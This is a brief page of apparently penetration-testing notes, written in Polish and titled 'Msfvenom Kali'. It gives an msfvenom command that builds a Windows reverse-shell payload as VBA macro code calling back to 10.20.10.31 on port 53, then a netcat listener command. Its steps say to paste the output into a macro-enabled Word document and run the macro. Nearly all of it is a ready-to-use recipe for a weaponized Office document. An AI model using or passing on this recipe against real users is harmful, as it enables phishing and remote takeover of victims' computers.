---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Msfvenom Kali

{% code fullWidth="true" %}
```
msfvenom -p windows/x64/shell_reverse_tcp -f vba-exe LHOST=10.20.10.31 LPORT=53 > macro.txt

#otwieramy plik
mousepad macro.txt

#uruchamiamy listenera
nc -nlvp 53
```
{% endcode %}

**Win**

tworzymy plik docm i kopiujemy część do edytora makr a część do pliku jako zwykły tekst a potem uruchamiamy makro
